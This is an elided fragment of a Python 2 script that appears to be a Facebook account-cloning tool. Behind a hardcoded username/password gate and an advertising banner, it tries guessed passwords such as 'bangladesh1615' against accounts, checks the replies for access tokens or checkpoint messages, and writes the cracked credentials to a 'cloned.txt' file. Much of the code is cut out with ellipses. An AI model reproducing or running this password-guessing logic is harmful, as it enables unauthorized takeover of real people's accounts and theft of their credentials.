...
"""
CorrectUsername = "Pham"
CorrectPassword = "Bach"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://m.facebook.com/KunDepTrai.Fan')
    else:
...
def login():
    os.system('clear')
    print logo1
    print "\\033[1;43m[1]\x1b[1;97mSTART WITH REAL STAR( \033[1;92m NOW)"
    time.sleep(0.05)
...
def action():
    ...
    jalan("\033[0;92mREAL STAR '")
    jalan("\033[0;92mWHATAAP")
    jalan("\033[0;92m03455453538")
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(Cp) ' + k + c + user + '  ◀▶  ' + pass6 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass6+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass6)
                                        else:
                                            pass7="bangladesh1615"
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(Cp) ' + k + c + user + '  ◀▶  ' + pass7
                                                    cps = open('save/cloned.txt', 'a')
